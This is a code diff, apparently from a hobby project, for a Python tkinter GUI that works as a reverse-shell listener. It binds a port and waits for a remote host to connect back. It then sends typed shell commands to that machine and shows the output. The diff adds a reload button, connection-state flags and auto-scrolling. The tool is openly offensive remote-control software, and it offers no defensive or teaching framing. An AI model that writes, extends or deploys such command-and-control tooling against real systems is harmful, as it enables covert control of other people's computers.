@@ -8,6 +8,8 @@ default_Lport = 9999
 Lip=''
 Lport = 0
 
+global be_con
+be_con = 0
 global con_flag,start_flag
 con_flag = 0
 start_flag = 0
@@ -22,14 +24,18 @@ class start_thread(Thread):
             show_command.insert('end','Setting Done!\n')
         ready = ("[+] Setting Done!")
         show_command.insert('end',ready+'\n')
+        show_command.see('end')
         start_button.config(state = tk.NORMAL)
         global start_flag
         start_flag = 1
 
 class con_thread(Thread):
     def run(self):
-        ready = ("[+] Wating...")
+        ready = "[+] LHOST IP:"+str(ip_port[0])+'\n'
+        ready += "[+] LHOST Port:"+str(ip_port[1])+'\n'
+        ready += ("[+] Wating...")
         show_command.insert('end',ready+'\n')
+        show_command.see('end')
         global sk,conn,address
         sk = socket.socket()
         sk.bind(ip_port)
@@ -45,8 +51,28 @@ class con_thread(Thread):
         connect_and_start += "[+] RHOST Port:"+str(address[1])+'\n'
         connect_and_start += "[+] Can Type Command!"
         show_command.insert('end',connect_and_start + '\n')
+        show_command.see('end')
         show_connect_information.insert(1,str(address[0])+' : '+str(address[1]))
+        show_connect_information.see('end')
         connect_button.config(state = tk.NORMAL)
+        global be_con
+        be_con = 1
+        
+        
+def reload_button():
+    global start_flag,con_flag,be_con,Lip,Lport
+    Lip=''
+    Lport=0
+    start_flag = 0
+    con_flag = 0
+    be_con = 0
+    reload_con = 'exit'+" && echo [+] Command Request Done!"
+    conn.send(reload_con.encode())
+    conn.close()
+    show_command.insert('end',"[X] Connect Close"+'\n')
+    show_command.insert('end','reload!\n')
+    show_command.see('end')
+
 
 def build():
     show_command.insert('end','\n')
@@ -55,6 +81,7 @@ def help_button():
     show_help = "[+] Help:\n"
     show_help += "[+] Can Type Command!"
     show_command.insert('end',show_help + '\n')
+    show_command.see('end')
         
 def set_Lip_and_Lport():
     global Lip,Lport
@@ -64,28 +91,36 @@ def set_Lip_and_Lport():
         Lip = default_Lip
         Lport = default_Lport
         show_command.insert('end','IP and Port not change!\n')
+        show_command.see('end')
     else:
         Lip = type_ip.get()
         Lport = type_port.get()
         show_command.insert('end','IP and Port Settng Done!\n')
         show_command.insert('end','Set IP:'+Lip+'\n')
         show_command.insert('end','Set Port:'+Lport+'\n')
+        show_command.see('end')
 
 
 def start():
-    if start_flag == 0:
+    if (start_flag == 0)&(be_con == 0):
         start_button.config(state = tk.DISABLED)
         start_thread(daemon = True).start()
     elif start_flag == 1:
         show_command.insert('end','Started\n')
+    elif be_con == 1:
+        show_command.insert('end','Need reload\n')
     
     
 def con():
-    if con_flag == 0:
+    if (con_flag == 0)&(be_con == 0):
         connect_button.config(state = tk.DISABLED)
         con_thread(daemon = True).start()
-    else:
+    elif con_flag == 1:
         show_command.insert('end','Need Start\n')
+        show_command.see('end')
+    elif be_con == 1:
+        show_command.insert('end','Need reload')
+        show_command.see('end')
 
 def send_command_fuc():
     if start_flag == 0:
@@ -99,14 +134,18 @@ def send_command_fuc():
         if data == 'exit'+" && echo [+] Command Request Done!":
             conn.send(data.encode())
             show_command.insert('end',"[X] Connect Close"+'\n')
+            show_command.see('end')
             conn.close()
         elif data == 'help'+" && echo [+] Command Request Done!":
             show_command.insert('end',"exit to quit"+'\n')
+            show_command.see('end')
         elif data != '':
             conn.send(data.encode())
             show_command.insert('end',(conn.recv(4096).decode('big5'))+'\n')
+            show_command.see('end')
         elif data == ' && echo [+] Command Request Done!':
             show_command.insert('end',"pls enter"+'\n')
+            show_command.see('end')
 
 window = tk.Tk()
 window.geometry('800x500')
@@ -121,7 +160,7 @@ start_button.grid(row=2,column=6)
 connect_button = tk.Button(window,text='connect',command=con)
 connect_button.grid(row=3,column=4)
 show_command = tk.Text(window,width=60,height=30)
-show_command.grid(row=3,column=0,columnspan=3)
+show_command.grid(row=3,column=0,columnspan=3)    
 ip_address = tk.Label(window,text="LHOST IP:").grid(row=1,column=4)
 open_port = tk.Label(window,text="LHOST PORT:").grid(row=2,column=4)
 type_ip = tk.Entry(window,show = None)
@@ -135,4 +174,6 @@ show_connect_information = tk.Listbox(window)
 show_connect_information.grid(row=3,column=4,sticky=tk.S,ipadx=15,ipady=5,columnspan=2,padx=15)
 build_button = tk.Button(window,text='build client',command=build)
 build_button.grid(row=1,column=7,rowspan=2,ipady=5)
+reload_button = tk.Button(window,text="reload",command=reload_button)
+reload_button.grid(row=3 ,column=6)
 window.mainloop()
